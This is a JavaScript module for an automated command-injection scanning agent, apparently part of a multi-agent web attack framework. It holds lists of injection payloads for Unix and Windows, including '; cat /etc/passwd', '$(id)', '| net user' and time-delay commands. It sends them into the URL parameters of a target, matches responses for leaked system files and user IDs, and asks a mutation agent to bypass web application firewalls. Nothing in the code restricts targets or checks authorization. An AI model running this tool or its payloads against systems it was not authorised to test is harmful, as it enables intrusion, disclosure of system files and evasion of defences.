const BaseAgent = require('../core/BaseAgent');
const axios = require('axios');
const PAYLOADS = require('../utils/Payloads');

class CommandInjectionAgent extends BaseAgent {
    constructor() {
        super('CommandInjectionAgent', 'SPECIALIST');
        this.CMDI_INDICATORS = [
            /root:.*:0:0/i, /uid=\d+/i, /Windows IP Configuration/i,
            /bin\/(sh|bash|zsh)/i, /Directory of/i, /total \d+/i,
            /daemon:/i, /nobody:/i, /www-data/i
        ];
        this.TIMING_COMMANDS = {
            unix: ['sleep 5', '$(sleep 5)', '`sleep 5`', '| sleep 5', '; sleep 5', '\n sleep 5'],
            windows: ['& timeout /t 5', '| timeout /t 5', '& ping -n 6 127.0.0.1']
        };
        this.OS_COMMANDS = {
            unix: ['; cat /etc/passwd', '| cat /etc/passwd', '`cat /etc/passwd`', '$(cat /etc/passwd)',
                '; id', '| id', '$(id)', '`id`', '\n id', '|| id', '&& id',
                '; ls -la /', '$(ls)', '| whoami', '; uname -a'],
            windows: ['& type C:\\Windows\\win.ini', '| type C:\\Windows\\win.ini',
                '& dir C:\\', '| net user', '& whoami', '| systeminfo']
        };
    }

    async process(task) {
        if (task.type === 'TASK_ASSIGNED') {
            await this.executeAttack(task.payload);
            this.emitComplete();
        }
    }

    async executeAttack(payload) {
        this.log(`💉 Testing Command Injection: ${payload.url}`);

        // SHANNON ACCURACY: Baseline measurement
        let baseline = 0;
        try {
            const start = Date.now();
            await this._sendRequest(payload.url, payload.method, payload.headers, payload.body, payload.cookies);
            baseline = Date.now() - start;
            this.log(`  Baseline latency: ${baseline}ms`);
        } catch (e) {
            this.log(`⚠️ Baseline check failed, assuming 0ms.`);
        }

        const allPayloads = [
            ...this.OS_COMMANDS.unix,
            ...this.OS_COMMANDS.windows
        ];

        // Phase 1: Error-Based / Data-Leak Detection
        for (const vector of allPayloads) {
            try {
                const attackUrl = this._buildAttackUrl(payload, vector);
                const response = await this._sendRequest(attackUrl, payload.method, payload.headers, payload.body, payload.cookies);

                if (this._hasCommandOutput(response.body)) {
                    this.verifyAndEmit(
                        {
                            type: 'COMMAND_INJECTION', severity: 'CRITICAL', title: 'OS Command Injection',
                            description: `Command output reflected with payload: ${vector}`, endpoint: payload.url, payload: vector
                        },
                        { method: 'data_leak', evidence: response.body.substring(0, 500) }
                    );
                    return; // Critical, stop
                }

                // WAF Bypass
                if (response.status === 403 || response.status === 406) {
                    try {
                        const mutationResult = await this.askAgent('PayloadMutator', 'REQUEST_MUTATION', {
                            payload: vector, errorResponse: response.body,
                            errorStatus: response.status, vulnerabilityType: 'Command Injection'
                        }, 20000);

                        for (const mutated of (mutationResult.mutations || [])) {
                            const mutUrl = this._buildAttackUrl(payload, mutated);
                            const mutResp = await this._sendRequest(mutUrl, payload.method, payload.headers, payload.body, payload.cookies);
                            if (this._hasCommandOutput(mutResp.body)) {
                                this.verifyAndEmit(
                                    {
                                        type: 'COMMAND_INJECTION', severity: 'CRITICAL', title: 'Command Injection (WAF Bypassed)',
                                        description: `WAF bypassed: ${mutated}`, endpoint: payload.url, payload: mutated
                                    },
                                    { method: 'data_leak', evidence: mutResp.body.substring(0, 500) }
                                );
                                return;
                            }
                        }
                    } catch (err) {
                        this.log(`❌ Mutation timeout: ${err.message}`);
                    }
                }
            } catch (e) { /* skip */ }
        }

        // Phase 2: Time-Based Blind Detection
        const timingPayloads = [...this.TIMING_COMMANDS.unix, ...this.TIMING_COMMANDS.windows];
        for (const vector of timingPayloads) {
            try {
                const attackUrl = this._buildAttackUrl(payload, vector);
                const start = Date.now();
                await this._sendRequest(attackUrl, payload.method, payload.headers, payload.body, payload.cookies);
                const elapsed = Date.now() - start;

                const delta = elapsed - baseline;
                if (delta >= 4000) {
                    this.verifyAndEmit(
                        {
                            type: 'COMMAND_INJECTION', severity: 'HIGH', title: 'Blind Command Injection (Time-Based)',
                            description: `Response delayed ${delta}ms above baseline with: ${vector}`, endpoint: payload.url, payload: vector
                        },
                        { method: 'timing', evidence: `Baseline: ${baseline}ms, Elapsed: ${elapsed}ms, Delta: ${delta}ms` }
                    );
                    return;
                }
            } catch (e) { /* skip */ }
        }
    }

    _buildAttackUrl(payload, vector) {
        if (payload.method === 'GET' && payload.params) {
            const urlObj = new URL(payload.url);
            for (const [key] of Object.entries(payload.params)) {
                urlObj.searchParams.set(key, vector);
            }
            return urlObj.toString();
        }
        return payload.url;
    }

    _hasCommandOutput(body) {
        return this.CMDI_INDICATORS.some(p => p.test(body));
    }

    async _sendRequest(url, method, headers, data, cookies) {
        try {
            const config = {
                url, method: method || 'GET',
                headers: { ...headers, ...(cookies ? { Cookie: cookies } : {}) },
                data, timeout: 10000,
                validateStatus: () => true
            };
            const resp = await axios(config);
            return { status: resp.status, body: typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data) };
        } catch (e) {
            return { status: 0, body: e.message };
        }
    }
}

module.exports = new CommandInjectionAgent();
